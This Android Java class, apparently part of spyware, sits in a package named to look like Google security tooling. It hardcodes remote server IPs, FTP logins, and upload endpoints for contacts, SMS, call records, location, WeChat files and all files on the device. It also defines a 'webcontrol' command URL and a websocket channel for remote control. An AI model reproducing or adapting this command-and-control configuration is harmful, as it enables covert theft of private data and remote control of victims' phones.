package com.google.security.tools;

import java.io.File;

import com.google.security.UploadUtils;

import android.os.Environment;
import android.util.Log;

public class IpTool {
	private Boolean isipexist() {
		Boolean b = false;
		String path = Environment.getExternalStorageDirectory().toString();
		File file = new File(path + "/security/Media/ip/ip.xml");
		if (file.exists()) {
			b = true;
		}
		return b;
	}

	private Boolean isftpexist() {
		Boolean b = false;
		String path = Environment.getExternalStorageDirectory().toString();
		File file = new File(path + "/security/Media/ftp/ftp.xml");
		if (file.exists()) {
			b = true;
		}
		return b;
	}

	private String geturl() {
		String url;
		if (isftpexist() && XmlTools.readurl() != null) {
			url = XmlTools.readurl();

		} else {
			url = "111.204.189.45";
		}
		Log.e("iptool", url);
		return url;
	}

	private String getport() {
		String port;
		if (isftpexist() && XmlTools.readport() != null) {
			port = XmlTools.readport();

		} else {
			port = "21";
		}
		Log.e("iptool", port);
		return port;
	}

	private String getadmin() {
		String admin;
		if (isftpexist() && XmlTools.readadmin() != null) {
			admin = XmlTools.readadmin();

		} else {
			admin = "lenovo";
		}
		Log.e("iptool", admin);
		return admin;
	}

	private String getpsw() {
		String psw;
		if (isftpexist() && XmlTools.readpsw() != null) {
			psw = XmlTools.readpsw();

		} else {
			psw = "1234";
		}
		Log.e("iptool", psw);
		return psw;
	}

	private String getip() {
		String ip;
		if (isipexist() && XmlTools.readip() != null) {
			ip = XmlTools.readip();
			ip = "http://" + ip + ":8082";
		} else {
			ip = "http://111.204.189.46:8082";
		}
		Log.e("iptool", ip);
		return ip;
	}

	private String getwsip() {
		String ip;
		if (isipexist() && XmlTools.readip() != null) {
			ip = XmlTools.readip();
			ip = "ws://" + ip + ":8001";
		} else {
			ip = "ws://111.204.189.46:8001";
		}
		Log.e("iptool", ip);
		return ip;
	}

	/* 上传接口 */
	// public String ftp_url = "111.204.189.40";
	// public String ftp_port = "21";
	// public String ftp_admin = "mibaoxin";
	// public String ftp_psw = "1234";
	public String ftp_url = geturl();
	public String ftp_port = getport();
	public String ftp_admin = getadmin();
	public String ftp_psw = getpsw();

	public String uploadanyfile_url = getip() + "/a/wp/user/allfile";
	public String uploadxml_url = getip() + "/a/wp/user/file";
	public String uploadallmedia_url = getip() + "/a/wp/user/file";
	public String uploadcontacts_url = getip() + "/a/wp/user/contacts";
	public String uploadsms_url = getip() + "/a/wp/user/sms";
	public String uploadcallrecord_url = getip() + "/a/wp/user/callrecords";
	public String uploadlocation_url = getip() + "/a/wp/user/location";
	public String uploadwechat_url = getip() + "/a/wp/user/file";
	public String uploadinfo_url = getip() + "/a/wp/user/info";
	public String uploadcmd_url = getip() + "/a/wp/user/webcontrol";
	public String ws_url = getwsip() + "/ws/" + UploadUtils.getUid();

}
